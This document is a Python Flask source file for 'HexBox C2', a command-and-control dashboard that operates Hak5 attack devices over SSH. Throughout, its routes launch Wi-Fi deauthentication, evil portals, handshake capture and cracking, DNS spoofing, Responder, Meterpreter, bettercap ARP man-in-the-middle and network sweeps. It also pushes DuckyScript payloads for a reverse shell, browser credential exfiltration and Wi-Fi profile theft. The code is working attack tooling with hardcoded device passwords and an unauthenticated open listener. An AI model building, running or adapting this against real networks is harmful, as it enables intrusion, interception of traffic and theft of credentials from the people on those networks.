#!/usr/bin/env python3
# ~/hexbox/c2/hexbox_c2.py
# Central command for all Hak5 gear

from flask import Flask, render_template_string, request, jsonify
import subprocess, paramiko, requests, json, os, threading
from datetime import datetime

app = Flask(__name__)
LOOT = os.path.expanduser("~/hexbox/loot")

# Device registry - edit IPs to match your network
DEVICES = {
    "pineapple":     {"ip": "172.16.42.1",  "user": "root", "pass": "hak5pineapple"},
    "sharkjack":     {"ip": "172.16.24.1",  "user": "root", "pass": "hak5shark"},
    "packetsquirrel":{"ip": "172.16.32.1",  "user": "root", "pass": "hak5squirrel"},
    "lanturtle":     {"ip": "172.16.84.1",  "user": "root", "pass": "hak5turtle"},
    "omgplug":       {"ip": "192.168.1.50", "user": "root", "pass": "hak5omg"},
}

def ssh_exec(device, cmd):
    """SSH into a Hak5 device and run a command."""
    d = DEVICES[device]
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(d["ip"], username=d["user"], password=d["pass"], timeout=10)
        stdin, stdout, stderr = client.exec_command(cmd)
        out = stdout.read().decode() + stderr.read().decode()
        client.close()
        return out
    except Exception as e:
        return f"[ERR] {e}"

def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(f"{LOOT}/../logs/c2.log", "a") as f:
        f.write(f"[{ts}] {msg}\n")

DASH = """
<!DOCTYPE html><html><head><title>HexBox C2</title>
<style>
body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px}
button{background:#111;color:#0f0;border:1px solid #0f0;padding:10px;margin:5px;cursor:pointer}
button:hover{background:#0f0;color:#000}
pre{background:#000;border:1px solid #0f0;padding:10px;max-height:400px;overflow:auto}
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px}
.card{border:1px solid #0f0;padding:15px}
h2{color:#f00}
</style></head><body>
<h1>🔥 HexBox C2 // {{ts}}</h1>
<div class="grid">
<div class="card"><h2>WiFi Pineapple</h2>
  <button onclick="run('/pineapple/recon')">Recon Scan</button>
  <button onclick="run('/pineapple/deauth')">Deauth All</button>
  <button onclick="run('/pineapple/evil_portal')">Evil Portal</button>
  <button onclick="run('/pineapple/handshakes')">Pull Handshakes</button>
</div>
<div class="card"><h2>Shark Jack</h2>
  <button onclick="run('/shark/nmap')">Nmap Sweep</button>
  <button onclick="run('/shark/loot')">Pull Loot</button>
</div>
<div class="card"><h2>Packet Squirrel</h2>
  <button onclick="run('/squirrel/pcap')">Start PCAP</button>
  <button onclick="run('/squirrel/dnsspoof')">DNS Spoof</button>
  <button onclick="run('/squirrel/pull')">Pull PCAPs</button>
</div>
<div class="card"><h2>LAN Turtle</h2>
  <button onclick="run('/turtle/autossh')">AutoSSH Tunnel</button>
  <button onclick="run('/turtle/responder')">Responder</button>
  <button onclick="run('/turtle/meterpreter')">Meterpreter</button>
</div>
<div class="card"><h2>OMG Plug</h2>
  <button onclick="run('/omg/payload/reverse')">Reverse Shell DuckyScript</button>
  <button onclick="run('/omg/payload/exfil')">Exfil Browser Creds</button>
  <button onclick="run('/omg/payload/wifi')">Steal WiFi Profiles</button>
</div>
<div class="card"><h2>Pi Operator</h2>
  <button onclick="run('/pi/scan')">Local Nmap</button>
  <button onclick="run('/pi/responder')">Local Responder</button>
  <button onclick="run('/pi/bettercap')">Bettercap ARP MITM</button>
  <button onclick="run('/pi/handshake_crack')">Crack Handshakes</button>
</div>
</div>
<h2>Output</h2><pre id="out">Awaiting orders...</pre>
<script>
async function run(p){
  document.getElementById('out').textContent='[*] Executing '+p+'...';
  const r=await fetch(p,{method:'POST'});
  const j=await r.json();
  document.getElementById('out').textContent=j.output;
}
</script></body></html>
"""

@app.route("/")
def dash():
    return render_template_string(DASH, ts=datetime.now())

# -------- PINEAPPLE --------
@app.route("/pineapple/recon", methods=["POST"])
def p_recon():
    out = ssh_exec("pineapple", "pineap /tmp/pineap.conf && iw dev wlan1mon scan 2>&1 | head -100")
    log("Pineapple recon"); return jsonify(output=out)

@app.route("/pineapple/deauth", methods=["POST"])
def p_deauth():
    out = ssh_exec("pineapple", "aireplay-ng --deauth 10 -a $(iw dev wlan1mon scan | grep BSS | head -1 | awk '{print $2}') wlan1mon")
    return jsonify(output=out)

@app.route("/pineapple/evil_portal", methods=["POST"])
def p_portal():
    out = ssh_exec("pineapple", "/etc/init.d/evilportal start && evilportal start")
    return jsonify(output=out)

@app.route("/pineapple/handshakes", methods=["POST"])
def p_hand():
    os.system(f"sshpass -p '{DEVICES['pineapple']['pass']}' scp -r root@{DEVICES['pineapple']['ip']}:/root/handshakes/* {LOOT}/handshakes/ 2>&1")
    return jsonify(output=f"Handshakes pulled to {LOOT}/handshakes/")

# -------- SHARK JACK --------
@app.route("/shark/nmap", methods=["POST"])
def s_nmap():
    out = ssh_exec("sharkjack", "nmap -sS -sV -O -T4 $(ip route | grep default | awk '{print $3}')/24")
    return jsonify(output=out)

@app.route("/shark/loot", methods=["POST"])
def s_loot():
    os.system(f"sshpass -p '{DEVICES['sharkjack']['pass']}' scp -r root@{DEVICES['sharkjack']['ip']}:/root/loot/* {LOOT}/ 2>&1")
    return jsonify(output="Shark loot pulled")

# -------- PACKET SQUIRREL --------
@app.route("/squirrel/pcap", methods=["POST"])
def sq_pcap():
    out = ssh_exec("packetsquirrel", "tcpdump -i br-lan -w /mnt/loot/capture_$(date +%s).pcap &")
    return jsonify(output=out)

@app.route("/squirrel/dnsspoof", methods=["POST"])
def sq_dns():
    out = ssh_exec("packetsquirrel", "dnsspoof -i br-lan -f /root/hosts.txt &")
    return jsonify(output=out)

@app.route("/squirrel/pull", methods=["POST"])
def sq_pull():
    os.system(f"sshpass -p '{DEVICES['packetsquirrel']['pass']}' scp -r root@{DEVICES['packetsquirrel']['ip']}:/mnt/loot/*.pcap {LOOT}/pcaps/ 2>&1")
    return jsonify(output="PCAPs pulled")

# -------- LAN TURTLE --------
@app.route("/turtle/autossh", methods=["POST"])
def t_ssh():
    out = ssh_exec("lanturtle", "turtle module enable autossh && turtle module start autossh")
    return jsonify(output=out)

@app.route("/turtle/responder", methods=["POST"])
def t_resp():
    out = ssh_exec("lanturtle", "turtle module enable responder && turtle module start responder")
    return jsonify(output=out)

@app.route("/turtle/meterpreter", methods=["POST"])
def t_met():
    out = ssh_exec("lanturtle", "turtle module enable meterpreter && turtle module start meterpreter")
    return jsonify(output=out)

# -------- OMG PLUG (uses web API) --------
def omg_deploy(payload_file):
    """OMG devices accept payloads via their web UI API."""
    url = f"http://{DEVICES['omgplug']['ip']}/api/payload"
    with open(payload_file) as f:
        data = f.read()
    try:
        r = requests.post(url, json={"payload": data}, timeout=10)
        return r.text
    except Exception as e:
        return f"[ERR] {e}"

@app.route("/omg/payload/reverse", methods=["POST"])
def omg_rev():
    return jsonify(output=omg_deploy(os.path.expanduser("~/hexbox/payloads/reverse_shell.ducky")))

@app.route("/omg/payload/exfil", methods=["POST"])
def omg_exfil():
    return jsonify(output=omg_deploy(os.path.expanduser("~/hexbox/payloads/browser_exfil.ducky")))

@app.route("/omg/payload/wifi", methods=["POST"])
def omg_wifi():
    return jsonify(output=omg_deploy(os.path.expanduser("~/hexbox/payloads/wifi_steal.ducky")))

# -------- PI LOCAL --------
@app.route("/pi/scan", methods=["POST"])
def pi_scan():
    out = subprocess.getoutput("nmap -sS -T4 192.168.1.0/24")
    return jsonify(output=out)

@app.route("/pi/responder", methods=["POST"])
def pi_resp():
    threading.Thread(target=lambda: subprocess.call(
        f"responder -I eth0 -wrf > {LOOT}/../logs/responder.log 2>&1", shell=True)).start()
    return jsonify(output="Responder started on eth0")

@app.route("/pi/bettercap", methods=["POST"])
def pi_bc():
    threading.Thread(target=lambda: subprocess.call(
        "bettercap -iface wlan0 -eval 'set arp.spoof.fullduplex true; arp.spoof on; net.sniff on'",
        shell=True)).start()
    return jsonify(output="Bettercap MITM live")

@app.route("/pi/handshake_crack", methods=["POST"])
def pi_crack():
    threading.Thread(target=lambda: subprocess.call(
        f"for h in {LOOT}/handshakes/*.cap; do aircrack-ng -w /usr/share/wordlists/rockyou.txt $h >> {LOOT}/../logs/crack.log; done",
        shell=True)).start()
    return jsonify(output="Cracking initiated, check logs/crack.log")

if __name__ == "__main__":
    print("[+] HexBox C2 online at http://0.0.0.0:1337")
    app.run(host="0.0.0.0", port=1337, debug=False)
